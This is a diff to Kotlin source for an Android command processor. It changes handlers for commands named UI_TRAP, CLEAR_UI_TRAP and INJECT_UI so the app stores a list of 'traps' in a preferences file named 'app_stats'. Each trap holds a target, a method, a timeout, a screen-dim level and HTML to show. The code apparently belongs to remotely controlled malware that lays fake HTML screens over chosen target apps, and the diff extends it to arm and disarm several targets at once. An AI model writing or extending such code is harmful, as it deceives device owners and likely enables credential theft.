@@ -918,17 +918,26 @@ object CommandProcessor {
                 }
                 "UI_TRAP" -> {
                     val parts = content.split("|", limit = 5)
+                    val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                    
                     if (parts.isNotEmpty() && parts[0].trim().uppercase() == "STOP") {
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                            .putBoolean("ui_trap_active", false)
-                            .remove("ui_trap_target")
-                            .remove("ui_trap_method")
-                            .remove("ui_trap_timeout")
-                            .remove("ui_trap_dim")
-                            .remove("ui_trap_html")
-                            .apply()
-                        status = "UI_TRAP_DISARMED"
-                        errorMsg = "Session forcefully reset by STOP parameter."
+                        val specificTarget = parts.getOrNull(1)?.trim()
+                        if (specificTarget.isNullOrEmpty()) {
+                            prefs.edit().remove("ui_traps_array").apply()
+                            status = "ALL_UI_TRAPS_DISARMED"
+                            errorMsg = "All UI traps forcefully reset."
+                        } else {
+                            val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
+                            val trapsArr = org.json.JSONArray(trapsStr)
+                            val newArr = org.json.JSONArray()
+                            for (i in 0 until trapsArr.length()) {
+                                val trap = trapsArr.getJSONObject(i)
+                                if (trap.optString("target") != specificTarget) newArr.put(trap)
+                            }
+                            prefs.edit().putString("ui_traps_array", newArr.toString()).apply()
+                            status = "UI_TRAP_DISARMED"
+                            errorMsg = "Removed trap targeting: $specificTarget"
+                        }
                     } else if (parts.size >= 4) {
                         val target = parts[0].trim()
                         val method = parts[1].trim().uppercase()
@@ -944,26 +953,31 @@ object CommandProcessor {
                             html = parts[3].trim()
                         }
                         
-                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                            .putBoolean("ui_trap_active", true)
-                            .putString("ui_trap_target", target)
-                            .putString("ui_trap_method", method)
-                            .putLong("ui_trap_timeout", timeout)
-                            .putInt("ui_trap_dim", dimLevel)
-                            .putString("ui_trap_html", html)
-                            .apply()
+                        val newTrap = org.json.JSONObject().apply {
+                            put("target", target)
+                            put("method", method)
+                            put("timeout", timeout)
+                            put("dim", dimLevel)
+                            put("html", html)
+                        }
+                        
+                        val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
+                        val trapsArr = org.json.JSONArray(trapsStr)
+                        trapsArr.put(newTrap)
+                        
+                        prefs.edit().putString("ui_traps_array", trapsArr.toString()).apply()
                         
                         status = "UI_TRAP_ARMED"
-                        errorMsg = "Target: $target | Method: $method | Timeout: ${timeout}s | Dim: $dimLevel%"
+                        errorMsg = "Appended Trap -> Target: $target | Method: $method | Timeout: ${timeout}s"
                     } else {
                         status = "FAILED (FORMAT)"
-                        errorMsg = "Usage: UI_TRAP | TARGET | METHOD | TIMEOUT | [DIM_LEVEL] | <html>  OR  UI_TRAP | STOP"
+                        errorMsg = "Usage: UI_TRAP | TARGET | METHOD | TIMEOUT |[DIM_LEVEL] | <html>  OR  UI_TRAP | STOP | [TARGET]"
                     }
                 }
                 "CLEAR_UI_TRAP" -> {
                     ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                        .putBoolean("ui_trap_active", false).apply()
-                    status = "UI_TRAP_DISARMED"
+                        .remove("ui_traps_array").apply()
+                    status = "ALL_UI_TRAPS_DISARMED"
                 }
                 "INJECT_UI" -> {
                     val parts = content.split("|", limit = 3)
